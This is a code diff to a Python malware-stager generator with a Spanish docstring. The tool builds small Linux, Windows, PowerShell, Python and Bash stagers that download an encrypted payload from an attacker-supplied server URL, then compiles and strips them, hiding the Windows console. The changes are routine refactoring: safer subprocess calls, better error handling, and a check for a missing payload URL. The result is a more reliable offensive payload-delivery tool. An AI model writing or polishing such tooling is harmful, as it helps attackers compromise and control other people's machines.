@@ -10,15 +10,13 @@ Genera un stager mínimo que:
 Tamaño: ~400 bytes (Linux) / ~600 bytes (Windows)
 """
 
-import os, sys, socket, base64, random, struct, hashlib, argparse
+import os, sys, socket, base64, shutil, subprocess, argparse
 from pathlib import Path
 
 GREEN  = "\033[92m"; BLUE = "\033[94m"; YELLOW = "\033[93m"
 RED    = "\033[91m"; CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"
 
-PROJECT_ROOT = Path(__file__).parent.parent
-
-PROJECT_ROOT = Path(__file__).parent.parent
+PROJECT_ROOT = Path(__file__).resolve().parent.parent
 OUTPUT_DIR = PROJECT_ROOT / "payloads"
 OUTPUT_DIR.mkdir(exist_ok=True)
 
@@ -168,7 +166,7 @@ def get_local_ip():
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except:
+    except OSError:
         return "127.0.0.1"
 
 def main():
@@ -182,7 +180,12 @@ def main():
     args = parser.parse_args()
     
     server_url = args.server or default_url
-    
+
+    if not server_url:
+        print(f"{RED}[✗] No payload URL available. Pass one explicitly:{RESET}")
+        print(f"     python3 stager.py --server http://<host>:<port>/payload.enc{RESET}")
+        sys.exit(1)
+
     key = generate_key()
     key_hex = key.hex()
     
@@ -204,11 +207,11 @@ def main():
     print()
     
     targets = {
-        "linux":   ("c", generate_c_stager_linux(args.server, key_hex), ".c"),
-        "windows": ("c", generate_c_stager_windows(args.server, key_hex), ".c"),
-        "ps":      ("ps1", generate_ps_stager(args.server, key_hex), ".ps1"),
-        "python":  ("py", generate_python_stager(args.server, key_hex), ".py"),
-        "bash":    ("sh", generate_bash_stager(args.server, key_hex), ".sh"),
+        "linux":   ("c", generate_c_stager_linux(server_url, key_hex), ".c"),
+        "windows": ("c", generate_c_stager_windows(server_url, key_hex), ".c"),
+        "ps":      ("ps1", generate_ps_stager(server_url, key_hex), ".ps1"),
+        "python":  ("py", generate_python_stager(server_url, key_hex), ".py"),
+        "bash":    ("sh", generate_bash_stager(server_url, key_hex), ".sh"),
     }
     
     if args.os == "all":
@@ -224,25 +227,33 @@ def main():
             print(f"  [✓] C source ({name}): {c_path.name}")
             
             # Try to compile
-            cc = None
-            if name == "linux": cc = "gcc"
-            elif name == "windows": cc = "x86_64-w64-mingw32-gcc"
-            elif name == "darwin": cc = "x86_64-apple-darwin19-gcc"
-            
-            if cc and os.system(f"which {cc} >/dev/null 2>&1") == 0:
+            compiler = None
+            if name == "linux": compiler = "gcc"
+            elif name == "windows": compiler = "x86_64-w64-mingw32-gcc"
+            elif name == "darwin": compiler = "x86_64-apple-darwin19-gcc"
+
+            cc = shutil.which(compiler) if compiler else None
+            if cc:
                 bin_name = f"stager-{name}" + (".exe" if name == "windows" else "")
                 bin_path = out_dir / bin_name
-                flags = "-O2 -s"
-                if name == "windows": flags += " -lwininet -mwindows"
-                if name == "linux": flags += " -lcurl"
-                ret = os.system(f"{cc} {flags} -o {bin_path} {c_path} 2>/dev/null && strip {bin_path} 2>/dev/null")
-                if ret == 0 and bin_path.exists():
+                cmd = [cc, "-O2", "-s", "-o", str(bin_path), str(c_path)]
+                if name == "windows": cmd += ["-lwininet", "-mwindows"]
+                if name == "linux": cmd += ["-lcurl"]
+                r = subprocess.run(cmd, capture_output=True, text=True)
+                if r.returncode == 0:
+                    strip = shutil.which("strip")
+                    if strip:
+                        subprocess.run([strip, str(bin_path)], capture_output=True)
+                if r.returncode == 0 and bin_path.exists():
                     size = bin_path.stat().st_size
                     print(f"  [✓] Compiled ({name}): {bin_path.name} ({size} bytes)")
                 else:
-                    print(f"  [!] Compile manually: {cc} -O2 -s -o stager {c_path.name}")
+                    err = (r.stderr or "").strip()
+                    if err:
+                        print(f"  [!] Compiler error: {err.splitlines()[-1]}")
+                    print(f"  [!] Compile manually: {compiler} -O2 -s -o stager {c_path.name}")
             else:
-                print(f"  [!] Compile manually: gcc -O2 -s -o stager {c_path.name}")
+                print(f"  [!] '{compiler}' not found in PATH — compile manually: {compiler} -O2 -s -o stager {c_path.name}")
         else:
             path = out_dir / f"stager-{name}{ext}"
             path.write_text(code)
